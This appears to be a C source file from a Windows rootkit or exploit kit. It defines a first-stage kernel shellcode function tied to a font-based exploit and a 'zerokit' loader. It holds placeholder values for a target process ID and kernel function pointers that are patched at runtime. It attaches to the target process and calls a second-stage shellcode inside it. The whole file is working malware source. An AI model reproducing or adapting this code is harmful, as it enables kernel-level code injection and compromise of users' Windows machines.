#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#include "../../../../shared_code/types.h"
#include "../../../../loader/mod_shared/zerokit.h"

typedef NTSTATUS (*FnPsLookupProcessByProcessId)(HANDLE ProcessId, PEPROCESS *Process);
typedef VOID (*FnKeStackAttachProcess)(PKPROCESS  Process, PRKAPC_STATE ApcState);
typedef VOID (*FnKeUnstackDetachProcess)(PRKAPC_STATE ApcState);
typedef void (*FnScLevel1)();

VOID shellcode_ttf_level0()
{
    FnPsLookupProcessByProcessId fnPsLookupProcessByProcessId;
    FnKeStackAttachProcess fnKeStackAttachProcess;
    FnKeUnstackDetachProcess fnKeUnstackDetachProcess;
    FnScLevel1 fnScLevel1;
    uint32_t processId;
    PEPROCESS pEProcess;
    KAPC_STATE apcState;

// #ifdef _WIN64
//     __debugbreak();
// #else
//     __asm int 3
// #endif // _WIN64

#ifdef _WIN64
    __stosd((uint32_t*)&processId, 0xAAAAAAAAUL, 1);
    __stosq((uint64_t*)&fnScLevel1, 0xBBBBBBBBBBBBBBBBULL, 1);
    __stosq((uint64_t*)&fnPsLookupProcessByProcessId, 0xCCCCCCCCCCCCCCCCULL, 1);
    __stosq((uint64_t*)&fnKeStackAttachProcess, 0xDDDDDDDDDDDDDDDDULL, 1);
    __stosq((uint64_t*)&fnKeUnstackDetachProcess, 0xEEEEEEEEEEEEEEEEULL, 1);
#else
    __asm {
        mov dword ptr [processId], 0xAAAAAAAA
        mov dword ptr [fnScLevel1], 0xBBBBBBBB
        mov dword ptr [fnPsLookupProcessByProcessId], 0xCCCCCCCC
        mov dword ptr [fnKeStackAttachProcess], 0xDDDDDDDD
        mov dword ptr [fnKeUnstackDetachProcess], 0xEEEEEEEE
    }
#endif // W_IN64

    if (fnPsLookupProcessByProcessId((HANDLE)processId, &pEProcess) == STATUS_SUCCESS) {
        fnKeStackAttachProcess(pEProcess, &apcState);
        fnScLevel1();
        fnKeUnstackDetachProcess(&apcState);
    }
}
